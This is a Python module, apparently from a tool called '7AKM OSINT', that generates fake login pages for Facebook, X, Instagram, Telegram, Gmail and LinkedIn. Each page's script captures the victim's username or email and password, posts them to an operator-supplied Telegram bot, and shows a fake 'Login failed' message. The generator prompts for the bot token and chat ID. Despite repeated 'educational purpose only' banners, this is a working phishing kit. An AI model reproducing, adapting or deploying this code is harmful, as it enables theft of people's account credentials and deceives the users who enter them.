import os
import random
import string
from datetime import datetime
from colorama import Fore, Style
from config import REPORTS_DIR

# قوالب HTML للمنصات المختلفة
TEMPLATES = {
    "facebook": """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Educational Page</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; }
        .header { background: #4267b2; color: white; padding: 15px; text-align: center; }
        .container { max-width: 500px; margin: 20px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { width: 100%; padding: 12px; background: #4267b2; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        button:hover { background: #365899; }
        .footer { margin-top: 30px; padding: 10px; text-align: center; font-size: 12px; color: #999; border-top: 1px solid #eee; }
        .warning { background: #ffebee; border-left: 5px solid #f44336; padding: 15px; margin: 20px 0; text-align: left; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Facebook</h1>
    </div>
    <div class="container">
        <div class="warning">
            ⚠️ Educational Purpose Only ⚠️<br>
            This is a fake page created for learning about cybersecurity.
            Never use it to deceive others.
        </div>
        <h2>Log In</h2>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Email or Phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <p><a href="#">Forgotten password?</a></p>
        <div class="footer">
            -Tool 7AKM OSINT - - Developer : @G_X_V_7<br>
            This page is for educational purpose only.
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Send data to Telegram bot
            const botToken = 'BOT_TOKEN_PLACEHOLDER';
            const chatId = 'CHAT_ID_PLACEHOLDER';
            const message = `🔐 New Login Credentials:\nEmail: ${email}\nPassword: ${password}\n\n-Tool 7AKM OSINT - - Developer : @G_X_V_7`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert('Login failed. Please try again.'); // Fake message
                } else {
                    alert('Error. Please try again.');
                }
            })
            .catch(error => {
                alert('Network error. Please try again.');
            });
            
            // Clear fields
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
        });
    </script>
</body>
</html>""",

    "twitter": """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X (Twitter) - Educational Page</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Helvetica, Arial, sans-serif; background: #fff; }
        .header { background: #1da0f2; color: white; padding: 15px; text-align: center; }
        .container { max-width: 400px; margin: 20px auto; padding: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { width: 100%; padding: 10px; background: #1da0f2; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
        button:hover { background: #1982c8; }
        .footer { margin-top: 20px; padding: 10px; text-align: center; font-size: 12px; color: #999; }
        .warning { background: #ffebee; border-left: 5px solid #f44336; padding: 15px; margin: 20px 0; text-align: left; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header">
        <h1>X</h1>
    </div>
    <div class="container">
        <div class="warning">
            ⚠️ Educational Purpose Only ⚠️<br>
            This is a fake page for cybersecurity awareness.
        </div>
        <h2>Sign in to X</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone, email or username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
        <div class="footer">
            -Tool 7AKM OSINT - - Developer : @G_X_V_7<br>
            For education only. Do not misuse.
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            const botToken = 'BOT_TOKEN_PLACEHOLDER';
            const chatId = 'CHAT_ID_PLACEHOLDER';
            const message = `🐦 New X Credentials:\nUsername: ${username}\nPassword: ${password}\n\n-Tool 7AKM OSINT - - Developer : @G_X_V_7`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert('Login failed. Please try again.');
                } else {
                    alert('Error. Please try again.');
                }
            })
            .catch(error => {
                alert('Network error. Please try again.');
            });
            
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';
        });
    </script>
</body>
</html>""",

    "instagram": """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Educational Page</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #fff; }
        .header { background: linear-gradient(135deg, #405de6, #5851d8, #833ab4); color: white; padding: 20px; text-align: center; }
        .container { max-width: 350px; margin: 20px auto; padding: 20px; border: 1px solid #ededed; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ccc; border-radius: 3px; }
        button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 5px; font-size: 14px; font-weight: bold; cursor: pointer; }
        button:hover { background: #007ac2; }
        .footer { margin-top: 20px; padding: 10px; text-align: center; font-size: 12px; color: #999; }
        .warning { background: #ffe3e3; border-left: 5px solid #ffc107; padding: 10px; margin: 10px 0; text-align: left; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Instagram</h1>
    </div>
    <div class="container">
        <div class="warning">
            ⚠️ Educational Purpose Only ⚠️<br>
            No real data will be collected.
        </div>
        <h2>Log in to Instagram</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone, email or username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="footer">
            -Tool 7AKM OSINT - - Developer : @G_X_V_7<br>
            For educational purposes only.
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            const botToken = 'BOT_TOKEN_PLACEHOLDER';
            const chatId = 'CHAT_ID_PLACEHOLDER';
            const message = `📸 New Instagram Credentials:\nUsername: ${username}\nPassword: ${password}\n\n-Tool 7AKM OSINT - - Developer : @G_X_V_7`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert('Login failed. Please try again.');
                } else {
                    alert('Error. Please try again.');
                }
            })
            .catch(error => {
                alert('Network error. Please try again.');
            });
            
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';
        });
    </script>
</body>
</html>""",

    "telegram": """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram - Educational Page</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Helvetica, Arial, sans-serif; background: #e5ebef; }
        .header { background: #27a8e8; color: white; padding: 15px; text-align: center; }
        .container { max-width: 400px; margin: 20px auto; background: white; padding: 20px; border-radius: 10px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { width: 100%; padding: 10px; background: #27a8e8; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
        button:hover { background: #168cd7; }
        .footer { margin-top: 20px; padding: 10px; text-align: center; font-size: 12px; color: #999; }
        .warning { background: #fff3e0; border-left: 5px solid #ffd94b; padding: 15px; margin: 20px 0; text-align: left; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Telegram</h1>
    </div>
    <div class="container">
        <div class="warning">
            ⚠️ Educational Purpose Only ⚠️<br>
            This is a fake page for learning.
        </div>
        <h2>Sign in to Telegram</h2>
        <form id="loginForm">
            <input type="text" id="phone" placeholder="Phone number" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="footer">
            -Tool 7AKM OSINT - - Developer : @G_X_V_7<br>
            Educational purpose only.
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            
            const botToken = 'BOT_TOKEN_PLACEHOLDER';
            const chatId = 'CHAT_ID_PLACEHOLDER';
            const message = `📱 New Telegram Credentials:\nPhone: ${phone}\nPassword: ${password}\n\n-Tool 7AKM OSINT - - Developer : @G_X_V_7`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert('Login failed. Please try again.');
                } else {
                    alert('Error. Please try again.');
                }
            })
            .catch(error => {
                alert('Network error. Please try again.');
            });
            
            document.getElementById('phone').value = '';
            document.getElementById('password').value = '';
        });
    </script>
</body>
</html>""",

    "gmail": """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail - Educational Page</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Roboto, Arial, sans-serif; background: #f1f3f4; }
        .header { background: #dc4e41; color: white; padding: 15px; text-align: center; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        input[type="email"], input[type="password"] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dcdcdc; border-radius: 4px; }
        button { width: 100%; padding: 12px; background: #dc4e41; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 10px; }
        button:hover { background: #c53e32; }
        .footer { margin-top: 30px; padding: 10px; text-align: center; font-size: 12px; color: #999; }
        .warning { background: #ffe3e0; border-left: 5px solid #ffc107; padding: 15px; margin: 20px 0; text-align: left; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Gmail</h1>
    </div>
    <div class="container">
        <div class="warning">
            ⚠️ Educational Purpose Only ⚠️<br>
            Never enter real credentials here.
        </div>
        <h2>Sign in</h2>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Next</button>
        </form>
        <div class="footer">
            -Tool 7AKM OSINT - - Developer : @G_X_V_7<br>
            For educational purposes only.
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            const botToken = 'BOT_TOKEN_PLACEHOLDER';
            const chatId = 'CHAT_ID_PLACEHOLDER';
            const message = `📧 New Gmail Credentials:\nEmail: ${email}\nPassword: ${password}\n\n-Tool 7AKM OSINT - - Developer : @G_X_V_7`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert('Login failed. Please try again.');
                } else {
                    alert('Error. Please try again.');
                }
            })
            .catch(error => {
                alert('Network error. Please try again.');
            });
            
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
        });
    </script>
</body>
</html>""",

    "linkedin": """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LinkedIn - Educational Page</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #f3f2f0; }
        .header { background: #2877b4; color: white; padding: 15px; text-align: center; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { width: 100%; padding: 10px; background: #2877b4; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; font-weight: bold; }
        button:hover { background: #196492; }
        .footer { margin-top: 20px; padding: 10px; text-align: center; font-size: 12px; color: #999; }
        .warning { background: #fff3e0; border-left: 5px solid #ffc107; padding: 15px; margin: 20px 0; text-align: left; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header">
        <h1>LinkedIn</h1>
    </div>
    <div class="container">
        <div class="warning">
            ⚠️ Educational Purpose Only ⚠️<br>
            Do not use for real logins.
        </div>
        <h2>Sign in</h2>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Agree and Join</button>
        </form>
        <div class="footer">
            -Tool 7AKM OSINT - - Developer : @G_X_V_7<br>
            Educational purpose only.
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            const botToken = 'BOT_TOKEN_PLACEHOLDER';
            const chatId = 'CHAT_ID_PLACEHOLDER';
            const message = `💼 New LinkedIn Credentials:\nEmail: ${email}\nPassword: ${password}\n\n-Tool 7AKM OSINT - - Developer : @G_X_V_7`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert('Login failed. Please try again.');
                } else {
                    alert('Error. Please try again.');
                }
            })
            .catch(error => {
                alert('Network error. Please try again.');
            });
            
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
        });
    </script>
</body>
</html>"""
}

def generate_random_filename(extension=".html"):
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"fake_page_{random_str}_{datetime.now().strftime('%Y%m%d_%H%M%S')}{extension}"

def create_fake_page():
    print(Fore.YELLOW + "[*] Creating fake page (Educational Purpose Only)" + Style.RESET_ALL)
    print(Fore.RED + "⚠️  WARNING: This is for educational use only. Do not use for phishing or illegal activities!" + Style.RESET_ALL)
    
    # اختيار المنصة
    print(Fore.CYAN + "\nChoose platform:")
    platforms = list(TEMPLATES.keys())
    for i, name in enumerate(platforms, 1):
        print(f"   {i}. {name.capitalize()}")
    print(f"   {len(platforms)+1}. Custom HTML (enter your own code)")
    
    choice = input(Fore.MAGENTA + "Enter choice: ").strip()
    
    html_content = ""
    platform_name = ""
    
    try:
        idx = int(choice)
        if 1 <= idx <= len(platforms):
            platform_name = platforms[idx-1]
            html_content = TEMPLATES[platform_name]
        elif idx == len(platforms)+1:
            print(Fore.CYAN + "\nEnter/paste your HTML code (end with Ctrl+D on new line):")
            lines = []
            while True:
                try:
                    line = input()
                    lines.append(line)
                except EOFError:
                    break
            html_content = "\n".join(lines)
            platform_name = "custom"
        else:
            print(Fore.RED + "Invalid choice.")
            return
    except ValueError:
        print(Fore.RED + "Invalid input.")
        return
    
    if not html_content:
        print(Fore.RED + "Failed to load template.")
        return
    
    # طلب توكن البوت والايدي
    bot_token = input(Fore.MAGENTA + "\nEnter Telegram bot token (for receiving credentials): ").strip()
    chat_id = input(Fore.MAGENTA + "Enter Telegram chat ID: ").strip()
    
    if bot_token and chat_id:
        html_content = html_content.replace('BOT_TOKEN_PLACEHOLDER', bot_token)
        html_content = html_content.replace('CHAT_ID_PLACEHOLDER', chat_id)
        print(Fore.GREEN + "[+] Bot token and chat ID inserted. The page will send credentials to Telegram.")
    else:
        print(Fore.YELLOW + "[-] No bot token provided. The page will not send data anywhere.")
    
    # إضافة تحذير إضافي في أسفل الصفحة إذا لم يكن موجوداً
    if "educational" not in html_content.lower() and "تعليمي" not in html_content:
        warning_footer = f"""
<!-- Generated by 7AKM OSINT - Educational Purpose Only -->
<div style="background:#ffebee; border-left:5px solid #f44336; padding:15px; margin-top:30px; text-align:center; font-weight:bold;">
    ⚠️ This page was created for educational purposes by 7AKM OSINT. Do not misuse. ⚠️<br>
    -Tool 7AKM OSINT - - Developer : @G_X_V_7
</div>
</body>
</html>"""
        html_content = html_content.replace("</body>", warning_footer + "\n</body>")
    
    # حفظ الملف
    filename = generate_random_filename()
    filepath = os.path.join(REPORTS_DIR, filename)
    
    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html_content)
        print(Fore.GREEN + f"\n[+] Fake page created successfully!" + Style.RESET_ALL)
        print(Fore.CYAN + f"📁 Saved to: {filepath}" + Style.RESET_ALL)
        print(Fore.YELLOW + "\nYou can open this file in any web browser to view it." + Style.RESET_ALL)
        if bot_token and chat_id:
            print(Fore.YELLOW + "When someone enters credentials, they will be sent to your Telegram bot.")
        print(Fore.RED + "REMINDER: This is for educational purposes only. Never use it for phishing." + Style.RESET_ALL)
        return filepath
    except Exception as e:
        print(Fore.RED + f"[-] Error saving file: {e}")
        return None

def main():
    create_fake_page()
    input(Fore.CYAN + "\nPress Enter to continue..." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
